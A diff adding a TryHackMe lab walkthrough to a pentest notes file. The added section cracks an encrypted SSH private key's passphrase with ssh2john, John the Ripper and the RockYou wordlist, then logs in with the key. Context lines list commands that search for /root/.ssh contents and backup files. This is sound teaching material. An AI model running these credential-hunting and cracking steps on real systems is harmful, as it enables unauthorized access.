@@ -156,6 +156,41 @@ ls -la /root/.ssh/ 2>/dev/null
 find / -name "*.bak" -type f 2>/dev/null
 find / -name "*backup*" -type f 2>/dev/null
 ```
+## Encrypted SSH Key → SSH Access:
+
+During a simple engagement on TryHackMe, I discovered a private RSA key that began like this:
+
+```
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
+```
+
+The ```ENCRYPTED``` marker indicates that the private key is protected by a passphrase. I therefore copied the key into an ```id_rsa``` file on my attacking machine and converted it into a format suitable for John the Ripper:
+
+```
+ssh2john id_rsa > hash1.txt
+```
+
+I then used the good old RockYou wordlist to crack the passphrase:
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
+```
+
+Once the passphrase was recovered, I restricted the key's permissions and used it for SSH authentication:
+
+```
+chmod 600 id_rsa
+```
+
+And:
+
+```
+ssh -i id_rsa kay@10.113.132.23
+```
+
+A simple routine, but an extremely useful one to remember whenever an encrypted SSH private key turns up during enumeration.
 
 ## Credential Hunting:
 
